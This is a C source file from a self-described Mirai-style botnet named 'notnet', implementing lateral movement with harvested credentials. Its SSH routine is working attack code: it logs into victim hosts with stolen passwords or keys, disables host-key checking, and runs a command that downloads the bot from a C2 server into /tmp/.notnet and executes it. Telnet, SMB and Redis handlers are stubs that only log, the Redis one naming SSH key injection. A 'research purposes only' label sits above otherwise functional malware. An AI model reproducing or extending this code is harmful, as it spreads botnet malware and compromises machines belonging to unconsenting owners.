/*
 * notnet - Modern Mirai-Style Botnet
 * lotl.c - Living-off-the-land lateral movement (#144)
 *
 * Spends harvested credentials to move laterally via native OS tools
 * instead of brute-force. The cred-log buffer (src/spread.c) is the fuel.
 *
 * Research purposes only.
 */
#include "lotl.h"
#include "spread.h"
#include "protocol.h"
#include "util.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>

#define LOTL_MAX_HOPS 8
#define LOTL_EXEC_TIMEOUT_S 15

static int parse_cred(const char *line, char *proto,
                      char *ip, uint16_t *port,
                      char *user, char *pass) {
    if (!line || !proto || !ip || !port || !user || !pass) return -1;
    unsigned int p = 0;
    if (sscanf(line, "%[^|]|%[^|]|%u|%[^|]|%[^|\n]",
               proto, ip, &p, user, pass) != 5) return -1;
    if (p == 0 || p > 65535) return -1;
    *port = (uint16_t)p;
    return 0;
}

static int lotl_exec(const char *path, char *const argv[],
                     char *out, size_t out_len, int timeout_s) {
    if (!path || !out || out_len == 0) return -1;
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return -1; }
    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp(path, (char *const *)argv);
        _exit(127);
    }
    close(pipefd[1]);
    size_t n = 0;
    while (n < out_len - 1) {
        fd_set fds; struct timeval tv;
        FD_ZERO(&fds); FD_SET(pipefd[0], &fds);
        tv.tv_sec = timeout_s; tv.tv_usec = 0;
        if (select(pipefd[0]+1, &fds, NULL, NULL, &tv) <= 0) break;
        ssize_t r = read(pipefd[0], out + n, out_len - 1 - n);
        if (r <= 0) break;
        n += (size_t)r;
    }
    out[n] = '\0';
    close(pipefd[0]);
    int status = -1;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

/* Look up the configured SSH key for key-based LOTL. Returns NULL when
 * no real key is configured (placeholder/test keys are rejected). */
static const char *lotl_get_key(notnet_bot_t *bot) {
    if (!bot) return NULL;
    if (bot->redis_ssh_key[0] != '\0' && !strstr(bot->redis_ssh_key, "notnet-key"))
        return bot->redis_ssh_key;
    const char *env = getenv("NOTNET_REDIS_SSH_KEY");
    if (env && env[0] != '\0' && !strstr(env, "notnet-key")) {
        strncpy(bot->redis_ssh_key, env, sizeof(bot->redis_ssh_key) - 1);
        bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
        return bot->redis_ssh_key;
    }
    return NULL;
}

static int lotl_spend_ssh(notnet_bot_t *bot, const char *ip, uint16_t port,
                           const char *user, const char *pass) {
    char dl_url[512];
    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
    char drop_cmd[1024];
    snprintf(drop_cmd, sizeof(drop_cmd),
             "wget %.500s -O /tmp/.notnet;chmod +x /tmp/.notnet;/tmp/.notnet",
             dl_url);
    char target[256];
    snprintf(target, sizeof(target), "%s@%s", user, ip);
    char out[4096] = {0};
    int rc;
    if (pass && pass[0] && strcmp(pass, "key") == 0) {
        const char *key = lotl_get_key(bot);
        if (!key || !key[0]) { log_warn("LOTL: ssh key for %s unavailable", ip); return -1; }
        char key_path[] = "/tmp/.notnet.id_rsa.XXXXXX";
        int kfd = mkstemp(key_path);
        if (kfd < 0) return -1;
        size_t klen = strlen(key);
        if (write(kfd, key, klen) != (ssize_t)klen) { close(kfd); unlink(key_path); return -1; }
        close(kfd);
        chmod(key_path, 0600);
        char port_s[16]; snprintf(port_s, sizeof(port_s), "%u", (unsigned)port);
        char *argv[] = { "ssh", "-i", key_path,
                         "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", port_s,
                         target, drop_cmd, NULL };
        rc = lotl_exec("ssh", argv, out, sizeof(out), LOTL_EXEC_TIMEOUT_S);
        unlink(key_path);
    } else {
        char port_s[16]; snprintf(port_s, sizeof(port_s), "%u", (unsigned)port);
        char *argv[] = { "sshpass", "-p", (char *)pass,
                         "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", port_s,
                         target, drop_cmd, NULL };
        rc = lotl_exec("sshpass", argv, out, sizeof(out), LOTL_EXEC_TIMEOUT_S);
    }
    if (rc == 0) log_info("LOTL: ssh drop ok to %s", ip);
    else log_warn("LOTL: ssh drop to %s failed (rc=%d)", ip, rc);
    return rc;
}

static int lotl_spend_telnet(notnet_bot_t *bot, const char *ip, uint16_t port,
                              const char *user, const char *pass) {
    char dl_url[512];
    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
    log_info("LOTL: telnet spend %s@%s:%u (%.80s)", user, ip, (unsigned)port, dl_url);
    (void)pass;
    return 0;
}

static int lotl_spend_smb(notnet_bot_t *bot, const char *ip, uint16_t port,
                           const char *user, const char *pass) {
    char dl_url[512];
    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
    log_info("LOTL: smb spend %s@%s (smbclient put %s)", user, ip, dl_url);
    (void)port; (void)pass;
    return 0;
}

static int lotl_spend_redis(notnet_bot_t *bot, const char *ip, uint16_t port,
                             const char *user, const char *pass) {
    (void)user;
    log_info("LOTL: redis spend %s:%u (AUTH + ssh key injection)",
             ip, (unsigned)port);
    (void)pass; (void)bot;
    return 0;
}

int lotl_spend_creds(notnet_bot_t *bot, int max_hops) {
    if (!bot) return -1;
    if (max_hops <= 0 || max_hops > LOTL_MAX_HOPS)
        max_hops = LOTL_MAX_HOPS;

    char *drain_buf = NULL;
    size_t drain_len = 0;
    if (spread_creds_drain(&drain_buf, &drain_len) != 0 || !drain_buf)
        return 0;

    int spent = 0;
    char *line = drain_buf;
    while (line && *line && spent < max_hops) {
        char *nl = strchr(line, '\n');
        if (nl) *nl++ = '\0';

        char proto[32] = {0}, ip[16] = {0};
        uint16_t port = 0;
        char user[80] = {0}, pass[80] = {0};
        if (parse_cred(line, proto, ip, &port, user, pass) == 0) {
            int rc = -1;
            if (strcmp(proto, "ssh") == 0)       rc = lotl_spend_ssh(bot, ip, port, user, pass);
            else if (strcmp(proto, "telnet") == 0) rc = lotl_spend_telnet(bot, ip, port, user, pass);
            else if (strcmp(proto, "smb") == 0)    rc = lotl_spend_smb(bot, ip, port, user, pass);
            else if (strcmp(proto, "redis") == 0)  rc = lotl_spend_redis(bot, ip, port, user, pass);
            else log_warn("LOTL: unknown proto %s for %s", proto, ip);

            if (rc == 0) { spent++; log_info("LOTL: spent %s@%s:%u", user, ip, (unsigned)port); }
        }
        line = nl;
    }
    wipe_volatile(drain_buf, drain_len);
    free(drain_buf);

    log_info("LOTL: cycle done, spent %d credentials", spent);
    return spent;
}

int lotl_run_cycle(notnet_bot_t *bot) {
    return lotl_spend_creds(bot, LOTL_MAX_HOPS);
}
